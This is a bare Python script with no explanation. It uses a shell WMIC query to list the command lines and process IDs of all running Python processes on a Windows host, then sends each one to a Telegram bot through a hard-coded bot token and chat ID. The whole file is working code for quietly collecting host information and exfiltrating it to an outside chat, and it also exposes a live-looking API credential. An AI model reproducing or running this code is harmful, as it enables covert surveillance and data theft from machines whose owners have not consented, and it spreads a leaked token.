import subprocess
import requests
wmic_cmd = """wmic process where "name='python.exe' or name='pythonw.exe'" get commandline,processid"""
wmic_prc = subprocess.Popen(wmic_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
wmic_out, wmic_err = wmic_prc.communicate()
pythons = [item.rsplit(None, 1) for item in wmic_out.splitlines() if item][1:]
pythons = [[cmdline, int(pid)] for [cmdline, pid] in pythons]
for i in pythons:
	
	def nit(message):
                        
		apiToken = '5985340781:AAHBYJJSwv7Ku62JOR5z6NzrB9-z7MMGBxI'
		chatID = '1677109047'
		apiURL = f'https://api.telegram.org/bot{apiToken}/sendMessage'

		response = requests.post(apiURL, json={'chat_id': chatID, 'text': message})
		return response
	nit(f"{i}")

